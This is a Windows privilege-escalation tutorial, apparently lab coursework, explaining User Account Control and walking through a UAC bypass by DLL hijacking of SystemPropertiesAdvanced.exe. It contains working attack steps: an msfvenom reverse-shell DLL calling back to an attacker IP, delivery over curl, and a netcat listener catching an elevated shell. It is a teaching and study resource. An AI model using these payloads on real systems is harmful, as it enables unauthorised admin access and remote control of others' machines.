# Attacking the OS, Part 1: User Account Control

## Table of Contents
1. [What UAC Actually Is](#1-what-uac-actually-is)
2. [How UAC Splits Admin Tokens](#2-how-uac-splits-admin-tokens)
3. [The 10 Group Policy Settings That Control UAC](#3-the-10-group-policy-settings-that-control-uac)
4. [Checking a Target's Current UAC Configuration](#4-checking-a-targets-current-uac-configuration)
5. [Finding the Right Bypass for the Target's Windows Build](#5-finding-the-right-bypass-for-the-targets-windows-build)
6. [Understanding Windows' DLL Search Order](#6-understanding-windows-dll-search-order)
7. [Full Walkthrough: Bypassing UAC via SystemPropertiesAdvanced.exe](#7-full-walkthrough-bypassing-uac-via-systempropertiesadvancedexe)
8. [Cheat Sheet](#8-cheat-sheet)
9. [Big-Picture Takeaways](#9-big-picture-takeaways)

---

## 1. What UAC Actually Is

**User Account Control (UAC)** is the feature behind that familiar Windows pop-up asking "Do you want to allow this app to make changes to your device?" It works by giving every running program an **integrity level** — a rating of how much trust it's been given. Programs running at a high integrity level can perform actions that could genuinely compromise the system (installing software, changing system settings, etc.); programs at a lower level can't.

**The core rule:** when UAC is enabled, applications and tasks run as a **non-administrator**, by default — even if the logged-in account is technically an administrator — *unless* that administrator explicitly approves running something with full administrator-level access.

**Analogy:** Think of UAC as a courteous assistant standing next to even your most senior manager, who still has to formally ask, "Are you sure you want to do that?" before letting them sign off on anything consequential — even though the manager technically has the authority to approve it on their own.

**Critically important distinction:** Microsoft itself does **not** consider UAC a true security boundary — it's described as a **convenience feature** meant to protect administrators from *accidental* or *unintended* changes. It can still slow an attacker down and force them to be noisier (which is valuable for detection), but it was never designed to be an airtight wall against a determined attacker who already has code execution.

This [page](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/how-it-works) discusses how UAC works in great depth and includes the logon process, user experience, and UAC architecture. 

---

## 2. How UAC Splits Admin Tokens

When **Admin Approval Mode (AAM)** is enabled (which it is, by default), any administrator account you create gets issued **two separate access tokens** the moment they log in:
1. A full-privilege (high integrity) administrator token — used only when you explicitly elevate something.
2. A filtered, standard-user (medium integrity) token — used for everything else by default.

**Exception:** the **built-in RID 500 Administrator account** (the original, default admin account) always runs at the high integrity level directly — it isn't subject to this same token-splitting by default.

**Analogy:** Picture an executive who's handed two separate ID badges when they start the job: an everyday badge that only opens regular office doors, and a special badge, kept in a drawer, that opens the server room — which they only pull out and swipe when they deliberately choose to, confirming the action first.

### A Live Example

Here, the account `sarah` **is** a member of the local Administrators group, but her currently running `cmd.exe` process is still operating under her unprivileged, filtered token:

```
C:\evilcorp> whoami /user

USER INFORMATION
----------------

User Name         SID
================= ==============================================
winlpe-ws03\sarah S-1-5-21-3159276091-2191180989-3781274054-1002
```

```
C:\evilcorp> net localgroup administrators

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
sarah
The command completed successfully.
```

```
C:\evilcorp> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

Even though `sarah` is confirmed to be in the Administrators group, her current console's privilege list looks almost identical to a standard user's — a direct, visible demonstration of the filtered token at work.

---

## 3. The 10 Group Policy Settings That Control UAC

UAC's behavior can be fine-tuned by administrators, either locally (`secpol.msc`) or across an entire Active Directory domain via Group Policy. There are 10 configurable settings in total:

| Group Policy Setting | Registry Key | Default Setting |
|---|---|---|
| Admin Approval Mode for the built-in Administrator account | `FilterAdministratorToken` | Disabled |
| Allow UIAccess applications to prompt for elevation without using the secure desktop | `EnableUIADesktopToggle` | Disabled |
| Behavior of the elevation prompt for administrators in Admin Approval Mode | `ConsentPromptBehaviorAdmin` | Prompt for consent for non-Windows binaries |
| Behavior of the elevation prompt for standard users | `ConsentPromptBehaviorUser` | Prompt for credentials on the secure desktop |
| Detect application installations and prompt for elevation | `EnableInstallerDetection` | Enabled (home editions) / Disabled (enterprise editions) |
| Only elevate executables that are signed and validated | `ValidateAdminCodeSignatures` | Disabled |
| Only elevate UIAccess applications installed in secure locations | `EnableSecureUIAPaths` | Enabled |
| Run all administrators in Admin Approval Mode | `EnableLUA` | Enabled |
| Switch to the secure desktop when prompting for elevation | `PromptOnSecureDesktop` | Enabled |
| Virtualize file and registry write failures to per-user locations | `EnableVirtualization` | Enabled |

**The two settings worth remembering most for privilege escalation work:**
- `EnableLUA` — whether UAC is turned on at all.
- `ConsentPromptBehaviorAdmin` — how strict the elevation prompt is (covered in detail next).

The various settings are discussed in detail [here](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/settings-and-configuration?tabs=intune).

---

## 4. Checking a Target's Current UAC Configuration

### Step 1 — Is UAC even turned on?

```
C:\evilcorp> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    EnableLUA    REG_DWORD    0x1
```
`0x1` confirms UAC is enabled.

### Step 2 — How strict is the elevation prompt?

```
C:\evilcorp> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```

Here's the corrected breakdown of what each possible value actually means (per Microsoft's documentation), from least to most strict:

| Value | Behavior | Notes |
|---|---|---|
| `0` | Elevate without prompting | Least strict — essentially UAC turned off for admins |
| `1` | Prompt for credentials on the secure desktop | |
| `2` | Prompt for consent on the secure desktop | **This is the "Always notify" setting** — the strictest standard option |
| `3` | Prompt for credentials | |
| `4` | Prompt for consent | |
| `5` | Prompt for consent **for non-Windows binaries** | **This is the default setting** — Windows' own signed binaries auto-elevate silently; third-party programs still prompt |

**So a value of `0x5` means the box is sitting at the standard, out-of-the-box default level — not the maximum.** This actually works in an attacker's favor: at this default level, Windows will **silently auto-elevate its own trusted, signed binaries** without any prompt at all — and that's precisely the loophole the upcoming bypass technique exploits. (If the box had genuinely been set to `2`, "Always notify," fewer of these auto-elevation tricks would work, since Microsoft tightened this behavior specifically to reduce it at that strictest setting.)

---

## 5. Finding the Right Bypass for the Target's Windows Build

UAC bypasses generally exploit **flaws or unintended behavior specific to a particular Windows build** — they are *not* universal. Before picking a technique, you need to know exactly which build you're dealing with:

```
PS C:\evilcorp> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

Build number `14393` cross-references (via the [public Windows 10 version history](https://en.wikipedia.org/wiki/Windows_10_version_history)) to the **1607** feature update release.

<img width="978" height="507" alt="image" src="https://github.com/user-attachments/assets/e7cb2612-9ce9-45ff-a17a-9d157803a2c4" />

[UACME](https://github.com/hfiref0x/UACME) is a well-known community project that catalogs dozens of UAC bypass techniques, each tagged with:
- Which Windows build(s) it affects,
- The specific mechanism used,
- Whether Microsoft has since patched it.

For build 14393, **technique #54** is documented as applicable. It targets the **32-bit version of `SystemPropertiesAdvanced.exe`** — one of many Microsoft-signed binaries that Windows allows to **auto-elevate without showing a UAC consent prompt at all**, specifically because Windows trusts its own signed code (as explained in Section 4 above).

According to [this](https://egre55.github.io/system-properties-uac-bypass/) blog post, the 32-bit `SystemPropertiesAdvanced.exe` tries to load a DLL called `srrstr.dll` (normally used by System Restore) — **but that DLL doesn't actually exist on the system by default.** This "missing trusted DLL" situation is exactly what makes DLL hijacking possible here.

---

## 6. Understanding Windows' DLL Search Order

When a Windows program tries to load a DLL by name only (not a full path), the operating system searches through a specific, predictable sequence of locations until it finds a match:

```
1. The directory the application itself loaded from
2. The system directory (C:\Windows\System32 on 64-bit systems)
3. The 16-bit system directory (C:\Windows\System — not used on 64-bit systems)
4. The Windows directory
5. Any directories listed in the PATH environment variable
```

**Analogy:** Think of this like a librarian who checks a fixed list of shelves, in a fixed order, whenever someone asks for a book by title alone. If a convincingly-labeled fake copy is slipped onto an *earlier* shelf in that search order, the librarian hands over the fake without ever reaching the real (nonexistent, in this case) shelf.

Since `srrstr.dll` doesn't exist anywhere on the system, **whichever location gets checked successfully first** — if you can place a malicious file there — wins. Checking the current `PATH` for this specific user:

```
PS C:\evilcorp> cmd /c echo %PATH%

C:\Windows\system32;
C:\Windows;
C:\Windows\System32\Wbem;
C:\Windows\System32\WindowsPowerShell\v1.0\;
C:\Users\sarah\AppData\Local\Microsoft\WindowsApps;
```

The key detail: **`WindowsApps`, the very last folder on this list, lives inside the user's own profile — and is writable by that user.** None of the earlier, more trusted system folders are writable by a standard user, so this is the one weak link in the chain.

---

## 7. Full Walkthrough: Bypassing UAC via SystemPropertiesAdvanced.exe

### Step 1 — Build a malicious `srrstr.dll`

```
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll

Payload size: 324 bytes
Final size of dll file: 5120 bytes
```

### Step 2 — Host it and deliver it to the writable `WindowsApps` folder

```
$ sudo python3 -m http.server 8080
```
```
PS C:\evilcorp> curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
```

### Step 3 — Start a listener, then *sanity-test* the DLL at normal (unelevated) privilege

Before trying the real bypass, it's worth confirming the DLL itself works correctly by triggering it manually with `rundll32.exe` — this deliberately runs at **normal, unprivileged** rights, just to prove the payload functions:

```
$ nc -lvnp 8443
```
```
C:\evilcorp> rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```

```
$ nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.16] 49789

C:\Users\sarah> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

As expected: the DLL works, but this shell still only has standard, unprivileged rights — identical to the earlier `whoami /priv` output in Section 2. This confirms the payload itself is good; the real bypass still needs to happen.

### Step 4 — Clean up leftover test processes

Before the real attempt, make sure none of those earlier test executions of `rundll32.exe` are still lingering (they could interfere or just add noise):

```
C:\evilcorp> tasklist /svc | findstr "rundll32"
rundll32.exe                  6300 N/A
rundll32.exe                  5360 N/A
rundll32.exe                  7044 N/A

C:\evilcorp> taskkill /PID 7044 /F
C:\evilcorp> taskkill /PID 6300 /F
C:\evilcorp> taskkill /PID 5360 /F
```

### Step 5 — Trigger the real auto-elevating binary

```
C:\evilcorp> C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

This launches the **32-bit** build of `SystemPropertiesAdvanced.exe` (located under `SysWOW64`, where 32-bit binaries live on a 64-bit system). Because this is a Microsoft-signed, auto-elevating binary, it runs with elevated rights **without showing any UAC prompt** — and when it searches for `srrstr.dll` and fails to find it in the earlier, protected locations, it eventually finds (and loads) the malicious copy sitting in the writable `WindowsApps` folder.

### Step 6 — Catch the elevated shell

```
$ nc -lvnp 8443

connect to [10.10.14.3] from (UNKNOWN) [10.129.43.16] 50273

C:\Windows\system32>whoami
winlpe-ws03\sarah

C:\Windows\system32>whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
```

**The payoff:** this is still the same `sarah` account — `whoami` confirms the username hasn't changed — but the privilege list has transformed completely, now matching the **full administrator token**, including `SeDebugPrivilege`, `SeBackupPrivilege`, `SeTakeOwnershipPrivilege`, and more, all now available (even if several still show `Disabled` and would need to be separately enabled, as covered in earlier documents).

---

## 8. Cheat Sheet

| Goal | Command |
|---|---|
| Check your current privileges | `whoami /priv` |
| Confirm UAC is enabled | `REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA` |
| Check UAC prompt strictness level | `REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin` |
| Check exact Windows build number | `[environment]::OSVersion.Version` (PowerShell) |
| Check your writable folders in `PATH` | `cmd /c echo %PATH%` |
| Generate a malicious DLL payload | `msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f dll > payload.dll` |
| Manually trigger a DLL (no elevation) | `rundll32 shell32.dll,Control_RunDLL <path to dll>` |
| Find a UAC bypass matching a specific Windows build | Check the UACME project's technique list |

### Decision Flow: "Can I Bypass UAC Here?"

```
         ┌─────────────────────────────┐
         │ whoami /priv (check if      │
         │ current token is filtered)  │
         └───────────────┬─────────────┘
                         │
          Are you in Administrators group,
          but privileges look like a
          standard user's?
                         │
            ┌────────────┴───────────────┐
            │ Yes (token is filtered)    │ No (already elevated
            ▼                            │  or not an admin at all)
   Check EnableLUA (is UAC on?)           ▼
            │                         No bypass needed /
    ┌───────┴──────────┐                not applicable
    │ Enabled          │ Disabled
    ▼                  ▼
 Check Windows      UAC not in your
 build number        way at all —
    │                just elevate
    ▼                normally
 Find matching UAC
 bypass technique
 (e.g. via UACME)
    │
    ▼
 Identify the auto-elevating
 binary + its missing/hijackable DLL
    │
    ▼
 Place malicious DLL in a
 writable search-order location
    │
    ▼
 Trigger the auto-elevating binary
    │
    ▼
 Elevated (admin-token) shell
```

---

## 9. Big-Picture Takeaways

1. UAC is a **convenience feature**, not a true security boundary — Microsoft itself doesn't treat it as one, which is exactly why so many bypass techniques exist.
2. Even an account that's genuinely in the Administrators group runs with a filtered, standard-user token by default, thanks to Admin Approval Mode — always check `whoami /priv` rather than assuming group membership equals active privilege.
3. Checking the exact Windows build number is essential before picking a UAC bypass technique, since almost all of them are build-specific, not universal.
4. Many Microsoft-signed binaries are allowed to "auto-elevate" without any consent prompt at all — and some of them try to load DLLs that don't actually exist on a default installation, creating a DLL-hijacking opportunity.
5. Windows' predictable DLL search order, combined with a writable folder like a user's own `WindowsApps` directory appearing in `PATH`, is often all that's needed to plant a malicious DLL where a trusted process will pick it up.
6. Always sanity-test a malicious payload at normal privilege first (e.g., via `rundll32`) before attempting the real elevated trigger — it isolates whether a failure is due to the payload itself or the bypass technique.
7. Even at UAC's strictest "Always notify" setting, some binaries and techniques may still work — but the *default* setting (not the strictest, despite what this walkthrough's source material mistakenly claimed) is generally more permissive and offers attackers more auto-elevating binaries to target.
